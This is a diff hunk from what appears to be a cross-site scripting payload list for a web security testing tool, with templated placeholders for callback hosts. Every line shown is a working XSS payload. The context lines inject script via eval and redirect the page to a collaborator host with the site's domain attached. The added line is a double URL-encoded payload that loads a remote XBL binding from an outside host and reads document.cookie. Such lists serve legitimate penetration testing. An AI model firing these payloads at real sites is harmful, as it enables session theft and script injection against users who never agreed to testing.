@@ -13,6 +13,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'!-VARIABLE_XSS
 :1);}alert(document.domain);a={//\
 :1);}document.location=String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain;a={//\
 <@iframe_data_url>!-VARIABLE_XSS_HUNTER-!<@/iframe_data_url>
+test%2B%2527test%2522%25%2520style%3D-moz-binding%3Aurl%28%2527http%3A%2F%2Fsectroyer.110mb.com%2Fxss.xml%2523xss%2527%29%2520style%3Dbackground%3Aurl%28javascript%3Aalert%28document.cookie%29%29%2520test%3Dtest
 <@script_data>!-VARIABLE_XSS_HUNTER-!<@/script_data>
 <@uppercase_script>!-VARIABLE_XSS_HUNTER-!<@/uppercase_script>
 <@template_eval>!-VARIABLE_XSS_HUNTER-!<@/template_eval>
